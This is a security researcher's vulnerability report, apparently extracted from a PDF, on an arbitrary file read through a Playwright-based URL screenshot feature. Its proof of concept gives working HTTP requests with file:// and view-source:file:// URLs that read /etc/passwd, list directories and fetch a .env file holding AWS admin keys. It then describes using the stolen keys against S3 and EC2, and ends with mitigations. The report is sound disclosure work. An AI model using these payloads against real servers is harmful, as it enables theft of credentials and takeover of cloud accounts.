Arbitrary File Read via Playwright's Screenshot
Feature Exploiting File Wrapper

@timoxoszt (team7 of CyberJutsu.io)

Overview

Vulnerability Type

Arbitrary File Read

Affected Systems

Web Applications utilizing Playwright's screenshot feature

Description

This  report  outlines  a  critical  vulnerability  in  a  web  application  feature  that  uses
Playwright's screenshot capability. By exploiting this vulnerability, an attacker can use
the file:// URI  scheme  to  read  arbitrary  files  on  the  server's  filesystem,  potentially
leading to the exposure of sensitive information, including AWS credentials.

Vulnerability Details

Setting the Scene
AWS Key of Admin

Background: The .env file on the server contains AWS access keys for an administrative
user.  These  keys  grant  full  access  to  critical  AWS  services  like  S3  and  EC2.  If  these
credentials fall into the wrong hands, the attacker can manipulate these services at will,
leading to potentially catastrophic consequences.

Capabilities of the Admin AWS Key

1.  Access S3

•  List all S3 buckets
•  Read and write objects in any S3 bucket

2.  Access EC2

•  List, start, stop, or terminate EC2 instances
•  Modify security groups and other instance-related settings

1

Running the Application
Context: The development team is running their web application using pnpm dev. This
command  loads  the  environment  variables  from  the .env file,  which  includes  the
sensitive AWS access keys.

Steps to Start Application
pnpm dev

Proof of Concept

1.  Confirm Arbitrary File Read by Reading /etc/passwd

GET /?url=file:///etc/passwd&width=4000 HTTP/1.1
Host: 54.91.87.67:3089

The server's response contains the contents of the	/etc/passwd	file, verifying the
vulnerability

2.  Listing the /home directory

GET /?url=view-source:file:///home/&width=4000 HTTP/1.1
Host: 54.91.87.67:3089

2

The server's response contains the contents of the /home directory: ec2-user

3.  Listing the /home/ec2-user directory

GET /?url=view-source:file:///home/ec2-user/&width=4000 HTTP/1.1
Host: 54.91.87.67:3089

The server's response contains the contents of the /home/ec2-user directory:

.bash_logout

.bash_profile

.bashrc

.ssh

url-to-png ß here

…

4.  Access the .env file to retrieve sensitive credentials:

3

GET /?url=view-source:file:///home/ec2-user/url-to-png/.env&width=4000 HTTP/1.1
Host: 54.91.87.67:3089

The server's response contains the contents of the .env file, revealing the AWS

keys.

5.  Use Extracted Credentials to Access AWS Resources

The attacker configures the AWS CLI with the stolen credentials and lists all S3
buckets.

4

6.  Listing Files in the url2png-timoxoszt Bucket

The command output shows the list of files in the bucket:

7.  The attacker lists all EC2 instances

The command output shows the list of EC2 instances:

Potential Impact
•  Access S3:

o  The attacker can view all S3 buckets and their contents.
o  They can potentially upload, modify, or delete objects in these buckets.

•  Access EC2:

o  The attacker can list all running EC2 instances, start or stop them, and

even terminate them.

o  They can modify security groups, potentially leading to further security

breaches.

Mitigations

•  Restrict  URI  Schemes: Disable

the  use  of  any  URI  schemes  other

•

than http and https for the screenshot feature.
Input  Validation  and  Sanitization: Implement  strict
sanitization to ensure only allowed URIs are processed.

input  validation  and

5

Conclusion

The arbitrary file read vulnerability in the Playwright screenshot feature is critical and
poses  significant  risks  due  to  the  potential  exposure  of  sensitive  files  on  the  server.
Immediate action should be taken to restrict URI schemes and enhance input validation
to protect against this type of attack.

6

